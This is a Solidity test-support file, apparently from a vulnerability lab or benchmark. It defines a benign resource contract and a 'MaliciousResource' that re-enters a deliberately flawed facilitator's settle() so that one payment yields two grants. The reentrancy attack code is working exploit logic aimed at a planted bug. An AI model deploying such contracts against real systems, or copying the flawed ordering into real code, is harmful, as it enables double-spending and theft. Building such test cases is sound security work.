// SPDX-License-Identifier: Apache-2.0
pragma solidity 0.8.28;

import {V04_DoubleGrant, IResource} from "src/V04_DoubleGrant.sol";

/// @notice Benign resource  -  logs grants delivered to it via a public counter.
contract BenignResource is IResource {
    uint256 public deliveries;

    function deliver(
        address,
        /* to */
        bytes32 /* resourceId */
    )
        external
    {
        deliveries += 1;
    }
}

/// @notice Malicious resource  -  reenters V04_DoubleGrant.settle() once during
/// its first deliver(), reproducing the on-chain analog of the
/// probabilistic-duplicate-service-grant race documented in
/// arXiv:2605.30998. Two grants land per one authorized payment
/// when the facilitator is in the interactions-before-effects
/// (planted) state.
contract MaliciousResource is IResource {
    V04_DoubleGrant public immutable facilitator;
    uint256 public deliveries;
    bool internal reentered;

    // Cached auth + sig for the reentrant call.
    V04_DoubleGrant.Auth internal reentrantAuth;
    uint8 internal reentrantV;
    bytes32 internal reentrantR;
    bytes32 internal reentrantS;

    constructor(V04_DoubleGrant _facilitator) {
        facilitator = _facilitator;
    }

    function armReentry(V04_DoubleGrant.Auth calldata a, uint8 v, bytes32 r, bytes32 s) external {
        reentrantAuth = a;
        reentrantV = v;
        reentrantR = r;
        reentrantS = s;
    }

    function deliver(
        address,
        /* to */
        bytes32 /* resourceId */
    )
        external
    {
        deliveries += 1;
        if (!reentered) {
            reentered = true;
            facilitator.settle(reentrantAuth, reentrantV, reentrantR, reentrantS);
        }
    }
}
